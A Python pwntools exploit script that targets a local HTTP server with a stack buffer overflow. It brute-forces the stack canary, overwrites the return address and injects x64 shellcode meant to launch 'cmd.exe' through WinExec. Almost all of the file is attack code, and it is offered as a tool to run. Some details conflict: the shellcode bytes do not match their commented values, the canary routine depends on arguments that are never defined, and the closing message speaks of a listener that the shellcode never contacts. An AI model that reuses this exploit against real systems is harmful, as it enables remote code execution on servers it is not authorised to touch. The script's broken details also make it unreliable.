# -*- coding: utf-8 -*-
# @Author: madrat

from __future__ import print_function
from pwn import *
import argparse
import struct
import time
import sys

CANARY_OFFSET = 0x1070
SHELLCODE_LOCATION = 0x1004a6000



base_payload = b"""
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""

#Content-Length: 4096


def pad(shellcode):
	while len(shellcode) % 8 != 0:
		shellcode += "\x90"
	return shellcode + ("\x90" * 8)


def ByteToHex(byteStr):
	return ''.join(["\\x%02x" % ord(x) for x in byteStr]).strip()

def HexToByte(hexStr):
	hexStr = hexStr.replace('\\x', '')

	bytes_ = []
	for i in range(0, len(hexStr), 2):
		bytes_.append(chr(int(hexStr[i:i+2], 16)))
	return "".join(bytes_)

def generate_shellcode():
	'''
	; Load the address of WinExec
	mov rax, 0x7ffedc241280

	; Push the address of 'cmd.exe' onto the stack
	mov rbx, 0x656d632e78652f64  ; 'cmd.exe\x00'
	push rbx                    ; Push the value onto the stack

	; Call WinExec
	mov rcx, rsp              ; Place 'cmd.exe' address in RCX
	call rax
	'''
	shellcode =  b"\x48\xB8\x28\x41\xC2\xED\xFF\x07\x00\x00" # movabs $0x7ffedc241280,%rax
	shellcode += b"\x48\xBB\x64\x2F\x65\x78\x2E\x63\x6D\x65" # movabs $0x656d632e78652f64,%rbx
	shellcode += b"\x53" 									 # push   %rbx
	shellcode += b"\x48\x89\xE1"							 # mov    %rsp,%rcx
	shellcode += b"\xFF\xD0"								 # call   *%rax

	return shellcode




def find_canary(args):
	canary = ''
	for _ in range(0, 8):
		for byte in range(0, 256):
			ps = connect(args.remoteadress, args.remoteport)
			ps.send(base_payload + 'A' * CANARY_OFFSET + canary + chr(byte))
			try:
				ps.recv(1024)
				print('[+] canary[%s] = \'\\x%s\'\n' % (hex(len(canary)), hex(byte)[2:].rjust(2, '0')))
				ps.close()
				break
			except:
				sys.stdout.write('\033[A[-] Trying canary: "%s\\x%s"\n' % (ByteToHex(canary), hex(byte)[2:].rjust(2, '0')))
				sys.stdout.flush()
			ps.close()

		canary += chr(byte)

	ps.close()
	return canary

def find_offset():
	# detect canary offset
	offset = 0
	while True:
	    ps = connect("127.0.0.1", 8080)
	    message = base_payload + b"a" * offset
	    ps.send(message)
	    try:
	        response = ps.recv()
	    except EOFError:
	        ps.close()
	        break
	    offset += 1
	    ps.close()
	offset -= 1
	return offset


def main():
	context(arch='amd64', os='windows')
	context.log_level = 'debug'
	
	ps = connect("127.0.0.1", 8080)
	
	#print('[?] Trying to build rop chain...')

	#chain = rop_chain(args)

	

	offset = 5066
	padding = b"A"*offset
	
	RIP = p64(0x7ffffc098) # ret 0x7ffffc098
	shellcode = generate_shellcode()
	




	ps.send(base_payload + padding + RIP + shellcode)

	print('[!] Completed! Check your listener... (If nothing happened, try restarting the exploit)')

	ps.recv(1024)


if __name__ == "__main__":
	main() 